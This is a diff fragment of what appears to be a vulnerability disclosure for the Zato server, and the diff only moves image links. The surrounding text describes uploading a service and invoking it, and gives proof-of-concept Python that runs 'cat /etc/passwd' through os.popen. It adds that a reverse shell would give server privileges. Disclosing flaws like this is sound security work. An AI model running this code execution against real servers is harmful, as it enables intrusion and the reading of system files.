@@ -5,6 +5,9 @@
 - Click uploaded files and click "Invoker",last submit.
 - Server execute code.If I change the command to "Bash Reverse Shell" ,i will gain server privileges.
 
+![](20211013134310.png)
+![](20211014133733.png)
+
 PoC:
 ```
 from zato.server.service import Service
@@ -15,5 +18,4 @@ class OeNotice(Service):
         self.response.payload={'result':os.popen("cat /etc/passwd").read()}
 ```
 
-![](./20211013134358.png)
-![](./20211013134517.png)
+
